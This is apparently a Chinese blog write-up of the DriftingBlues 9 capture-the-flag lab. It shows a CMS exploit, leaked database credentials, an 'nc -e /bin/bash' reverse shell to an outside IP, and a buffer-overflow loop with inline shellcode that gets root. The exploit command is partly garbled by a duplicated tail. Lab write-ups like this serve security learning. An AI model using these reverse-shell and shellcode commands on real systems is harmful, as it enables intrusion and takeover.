+++
title = "DriftingBlues 9"
date = 2026-06-15T20:17:23+08:00
draft = false
description = "一些打过的靶机"
tags = ["靶机"]
categories = ["靶机"]
series = ["靶机"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++
# 信息搜集 

只有一个80端口

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227130105080.png)


访问  发现关键信息

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227130132400.png)


查看页面信息    发现历史的cms漏洞

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227130239724.png)

然后新增加一个域名   

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227205740983.png)


寻找历史漏洞

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227210052100.png)

寻找这个漏洞路径


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227210156687.png)


# 漏洞利用

然后进行执行   看起来是python2  的这个版本的   发现已经执行成功的

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227210833930.png)


结合前面的路径扫描  找到 了这个数据库的密码   

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227211154616.png)

```c
<?php // DATABASE CONNECTION INFORMATION define('DATABASE_HOST', 'localhost'); // Database host define('DATABASE_NAME', 'microblog'); // Name of the database to be used define('DATABASE_USERNAME', 'clapton'); // User name for access to database define('DATABASE_PASSWORD', 'yaraklitepe'); // Password for access to database define('DB_ENCRYPT_KEY', 'p52plaiqb8'); // Database encryption key define('DB_PREFIX', 'mb101_'); // Unique prefix of all table names in the database ?>
```

```
clapton       yaraklitepe 
```   

# 反弹shell

命令  

```
nc -e /bin/bash 61.139.2.130 4444
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227211643003.png)

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227211652192.png)

然后变成交互式终端

```text
python -c 'import pty;pty.spawn("/bin/bash")'
```


# flag1

su切换

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227211924632.png)


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227212255527.png)


F569AA95FAFF65E7A290AB9ED031E04F


# flag2(pwn提权，乱七八槽的玩意)


进行文件传出


```
scp input root@61.139.2.130:/home/kali/input
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227213953082.png)


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227214025464.png)


然后 进行漏洞利用  （中间 有gdb调试，不懂）

```
for i in {1..10000}; do (/home/kali/input $(python -c 'print("A" * 171 + "\x40\x26\xc3\xbf" + "\x90"* 1000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80")')); done <\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80")')); done
```


先执行一次

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227214639517.png)


然后执行1w次


```c


# id
id
uid=1000(clapton) gid=1000(clapton) euid=0(root) groups=1000(clapton)
# cd /root
cd /root
# ls -al
ls -al
total 16
drwx------  2 root root 4096 May  9  2021 .
drwxr-xr-x 21 root root 4096 May  9  2021 ..
-rw-------  1 root root  649 May  9  2021 .bash_history
-rw-r--r--  1 root root  295 May  9  2021 root.txt
# cat root.txt
cat root.txt
   
this is the final of driftingblues series. i hope you·ve learned something from them.

you can always contact me at vault13_escape_service[at]outlook.com for your questions. (mail language: english/turkish)

your root flag:

04D4C1BEC659F1AA15B7AE731CEEDD65

good luck. ( ͡° ͜ʖ ͡°)

```






